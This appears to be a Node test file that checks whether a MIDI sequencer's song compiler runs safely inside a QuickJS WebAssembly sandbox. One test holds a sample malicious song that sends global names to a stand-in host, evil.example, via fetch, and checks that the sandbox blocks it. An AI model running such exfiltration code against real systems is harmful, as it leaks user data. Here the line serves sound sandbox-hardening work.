// Proof-of-concept: run the MIDI sequencer song compiler inside a QuickJS
// WebAssembly sandbox (quickjs-wasm from quickjs-rust-near/quickjslib) instead
// of new AsyncFunction on the host, and verify the generated event list is
// identical to the native songcompiler output.
//
// Run with: npm run test-quickjs-sandbox

import { test } from 'node:test';
import assert from 'node:assert';
import { readFile } from 'node:fs/promises';
import { createQuickJS } from 'quickjs-wasm';
import { compileSong as compileSongNative } from './midisequencer/songcompiler.js';

const STARTER_SONG = await readFile(new URL('./emptysong-midi.js', import.meta.url), 'utf8');

// The sequencer runtime is pure JS (no DOM), so the real sources can run
// inside the guest as one concatenated module: strip import statements and
// export keywords, prepend stubs for the few host-side touchpoints.
async function buildGuestModuleSource() {
    const sources = await Promise.all([
        'midisequencer/sequenceconstants.js',
        'midisequencer/pattern.js',
        'midisequencer/trackerpattern.js',
        'midisequencer/songcompiler.js',
    ].map(path => readFile(new URL(path, import.meta.url), 'utf8')));

    const stripped = sources.map(src => src
        .replace(/^import .*$/gm, '')
        .replace(/^export /gm, ''));

    const prelude = `
        globalThis.console = { log: print, warn: print, error: print };
        const setVideoSchedule = () => {};
    `;

    const wrapper = `
        export async function compileSongInSandbox() {
            const songsource = await env.callHostAsync({ function_name: 'getSongSource' });
            const events = await compileSong(songsource);
            return JSON.stringify(events);
        }

        export async function runEscapeSong() {
            const songsource = await env.callHostAsync({ function_name: 'getSongSource' });
            try {
                await compileSong(songsource);
                return 'song completed without error';
            } catch (e) {
                return 'blocked: ' + e;
            }
        }

        export function probeGlobals() {
            return JSON.stringify({
                fetch: typeof fetch,
                document: typeof globalThis.document,
                localStorage: typeof globalThis.localStorage,
                WebSocket: typeof globalThis.WebSocket,
                XMLHttpRequest: typeof globalThis.XMLHttpRequest,
                indexedDB: typeof globalThis.indexedDB,
            });
        }
    `;

    return prelude + stripped.join('\n') + wrapper;
}

async function createSandbox(songsource) {
    const quickjs = await createQuickJS();
    quickjs.hostFunctions['getSongSource'] = async () =>
        quickjs.allocateJSstring(songsource);
    const bytecode = quickjs.compileToByteCode(await buildGuestModuleSource(), 'songcompiler-sandbox.js');
    return { quickjs, mod: quickjs.loadByteCode(bytecode) };
}

async function callSandbox(quickjs, mod, exportedFunction) {
    const promise = quickjs.callModFunction(mod, exportedFunction);
    await quickjs.waitForPendingAsyncInvocations();
    return quickjs.getPromiseResult(promise);
}

test('sandboxed song compilation matches native songcompiler output', async () => {
    const nativeEvents = await compileSongNative(STARTER_SONG);
    assert.ok(nativeEvents.length > 0, 'native compile should produce events');

    const { quickjs, mod } = await createSandbox(STARTER_SONG);
    const sandboxEvents = JSON.parse(await callSandbox(quickjs, mod, 'compileSongInSandbox'));

    assert.deepStrictEqual(sandboxEvents, JSON.parse(JSON.stringify(nativeEvents)));
    console.log(`sandbox produced ${sandboxEvents.length} events, identical to native output`);
});

test('sandbox has no browser/host globals', async () => {
    const { quickjs, mod } = await createSandbox('');
    const globals = JSON.parse(quickjs.callModFunction(mod, 'probeGlobals'));
    assert.deepStrictEqual(globals, {
        fetch: 'undefined',
        document: 'undefined',
        localStorage: 'undefined',
        WebSocket: 'undefined',
        XMLHttpRequest: 'undefined',
        indexedDB: 'undefined',
    });
});

test('malicious song cannot reach the network from the sandbox', async () => {
    // In the current new AsyncFunction setup this song would exfiltrate
    // whatever it likes via fetch. In the sandbox fetch does not exist.
    const maliciousSong = `
        setBPM(120);
        await fetch('https://evil.example/steal?data=' + JSON.stringify(Object.keys(globalThis)));
    `;
    const { quickjs, mod } = await createSandbox(maliciousSong);
    const result = await callSandbox(quickjs, mod, 'runEscapeSong');
    assert.match(result, /^blocked: ReferenceError/);
    console.log(result);
});
